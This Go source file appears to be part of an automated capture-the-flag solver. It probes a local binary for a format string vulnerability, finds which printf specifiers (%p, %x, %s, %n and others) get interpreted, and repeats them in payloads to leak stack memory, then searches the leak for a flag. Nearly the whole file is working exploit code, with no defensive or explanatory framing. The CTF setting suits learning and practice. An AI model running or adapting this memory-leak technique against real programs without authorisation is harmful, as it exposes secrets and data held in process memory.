package main

import (
	"bytes"
	"fmt"
	"os/exec"
	"strings"
)

type formatStringExploiter struct {
	SuccessChunks []string
}

var specifiers = []string{
	"%p",
	"%x",
	"%s",
	"%d",
	"%i",
	"%u",
	"%c",
	"%n",
	"%h",
	"%l",
	"%f",
	"%e",
	"%g",
	"%a",
	"%m",
	"%t",
}

func NewFormatStringExploiter() *formatStringExploiter {
	return &formatStringExploiter{}
}

func (f *formatStringExploiter) FindWorkingFormatSpecifiers() []string {

	validSpecifiers := []string{}

	for _, specifier := range specifiers {
		cmd := exec.Command(globalScope.binaryPath)
		cmd.Stdin = strings.NewReader(specifier)
		output := &bytes.Buffer{}
		stdErr := &bytes.Buffer{}
		cmd.Stdout = output
		cmd.Stderr = stdErr
		err := cmd.Run()
		if err != nil {
			fmt.Println("Error running command: ", err)
		}
		if !strings.Contains(output.String(), specifier) && cmd.ProcessState.ExitCode() == 0 {
			validSpecifiers = append(validSpecifiers, specifier)
		}

	}
	fmt.Print("Valid specifiers: ")
	for _, specifier := range validSpecifiers {
		fmt.Print(specifier)
		fmt.Print(", ")

	}
	fmt.Print("\n")
	return validSpecifiers

}

func (f *formatStringExploiter) ExtractDataFromFormatSpecifiers(specifiers []string) map[string]string {
	mapSpecifiers := map[string]string{}
	amountOfSpecifiers := 30
	for _, specifier := range specifiers {
		payload := "___"
		payload += strings.Repeat(specifier+"_", amountOfSpecifiers)
		payload += "___"
		cmd := exec.Command(globalScope.binaryPath)
		cmd.Stdin = strings.NewReader(payload)
		output := &bytes.Buffer{}
		stdErr := &bytes.Buffer{}
		cmd.Stdout = output
		cmd.Stderr = stdErr
		err := cmd.Run()
		if err != nil {
			fmt.Println("Error running command: ", err)
		}
		chunks := strings.Split(output.String(), "___")
		if len(chunks) < 2 {
			continue
		}
		usefulOutput := f.cleanUsefulOutput(chunks[1])
		mapSpecifiers[specifier] = usefulOutput
	}
	return mapSpecifiers
}

func (f *formatStringExploiter) cleanUsefulOutput(usefulOutput string) string {
	cleanedOutput := usefulOutput
	for _, chunk := range f.SuccessChunks {
		cleanedOutput = strings.Replace(cleanedOutput, chunk, "", -1)
	}
	return cleanedOutput
}

func (f *formatStringExploiter) hasVulnerability() bool {
	// send random data to the binary and compare the output the initial Output
	// to see if the binary is vulnerable to format string attacks
	cmd := exec.Command(globalScope.binaryPath)
	cmd.Stdin = strings.NewReader("A")
	output := &bytes.Buffer{}
	stdErr := &bytes.Buffer{}
	cmd.Stdout = output
	cmd.Stderr = stdErr
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error running command: ", err)
	}
	fmt.Println(output.String())
	if !bytes.Contains(output.Bytes(), []byte("A")) {
		fmt.Println("Binary might not be vulnerable to format string attacks")
		return false
	}
	fmt.Println("Binary might be vulnerable to format string attacks, output contains 'A' after sending 'A'")
	o := string(output.String())
	o = strings.Trim(o, " ")
	o = strings.Trim(o, "\n")
	o = strings.Trim(o, "\r")
	o = strings.Trim(o, "\t")
	chunks := strings.Split(o, " ")
	for _, chunk := range chunks {
		if chunk == "A" {
			continue
		}
		f.SuccessChunks = append(f.SuccessChunks, chunk)
		fmt.Println("Found a chunk: ", chunk)
	}
	return true

}
func (f *formatStringExploiter) Exploit() bool {
	if !f.hasVulnerability() {
		return false
	}
	specifiers := f.FindWorkingFormatSpecifiers()
	data := f.ExtractDataFromFormatSpecifiers(specifiers)

	readableData := ExtractFlagFromData(data)
	possibleFlags := []string{}
	for _, d := range readableData {
		possibleFlags = append(possibleFlags, strings.Join(d, ""))
	}

	fmt.Println("Possible flags:")
	for _, possibleFlag := range possibleFlags {
		fmt.Println(possibleFlag)
		flag := ExtractFlag(possibleFlag)
		if flag != "" {
			fmt.Println("Flag found: ", flag)
			return true
		}

	}
	fmt.Println("No flag found")

	return false
}
